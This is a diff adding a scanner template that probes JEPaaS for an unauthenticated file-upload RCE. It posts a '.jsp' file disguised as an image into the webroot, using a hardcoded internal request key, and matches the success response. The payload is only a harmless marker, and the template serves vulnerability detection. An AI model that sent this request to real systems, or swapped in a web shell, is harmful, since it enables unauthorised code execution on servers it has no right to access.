@@ -1,0 +1,36 @@
+id: poc-yaml-jepaas-document-upload-rce
+info:
+  name: JEPaaS Document Upload RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce, file-upload
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/je/document/file?bucket=webroot"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----21909179191068471382830692394"
+      Accept: "application/json, text/javascript, */*; q=0.01"
+      internalRequestKey: "schedule_898901212"
+    body: |
+      ------21909179191068471382830692394
+      Content-Disposition: form-data; name="files"; filename="2214.jsp"
+      Content-Type: image/jpeg
+
+      123
+      ------21909179191068471382830692394--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"操作成功\""
+          - "createTime"
+          - "fileKey"
